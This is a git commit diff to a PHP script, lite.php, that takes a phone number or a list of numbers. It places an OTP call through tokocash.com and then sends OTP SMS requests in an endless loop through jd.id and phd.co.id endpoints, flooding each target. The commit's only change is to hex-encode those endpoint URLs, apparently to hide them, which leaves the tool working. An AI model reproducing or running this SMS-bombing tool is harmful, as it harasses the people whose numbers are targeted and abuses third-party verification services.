917a1cdbabbd7af3bc81e2fe7d3ceda9591a5934
Cvar1984 <gedzsarjuncomuniti@gmail.com>
2018-05-22 05:57:53 +0700

    Update

--- lite.php
+++ lite.php
@@ -68,11 +68,11 @@ echo $R."\n++++++++++++++++++++++++++++++++++++++".$G.$X."\n\n";
 isset($argv[1]) OR die($RR."[!] Input No List [!]\n".$X);
 if(is_numeric($argv[1])) {
 	echo "Calling     -> ".$G.$argv[1].$X."\n";
-	post_data('https://www.tokocash.com/oauth/otp',"msisdn=".$argv[1]."&accept=call");
+	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");
 	while(1) {
 		echo "Send OTP To -> ".$G.$argv[1].$X."\n";	
-		post_data("http://sc.jd.id/phone/sendPhoneSms","phone=".$argv[1]."&smsType=1");
-		post_data("https://www.phd.co.id/en/users/sendOTP","phone_number=".$argv[1]);
+		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
+		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[1]);
 	}
 }
 if(!file_exists($argv[1])) {
@@ -82,12 +82,12 @@ $argv[1]=explode("\n",file_get_contents($argv[1]));
 $argv[1]=str_replace(' ','',$argv[1]);
 foreach($argv[1] as $argv[2]):
 echo "Calling     -> ".$G.$argv[2].$X."\n";
-	post_data('https://www.tokocash.com/oauth/otp',"msisdn=".$argv[2]."&accept=call");
+	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[2]."&accept=call");
 endforeach;
 while(1) {
 foreach($argv[1] as $argv[2]):
 echo "Send OTP To -> ".$G.$argv[2].$X."\n";
-	post_data("http://sc.jd.id/phone/sendPhoneSms","phone=".$argv[2]."&smsType=1");
-	post_data("https://www.phd.co.id/en/users/sendOTP","phone_number=".$argv[2]);
+	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");
+	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[2]);
 endforeach;
 }
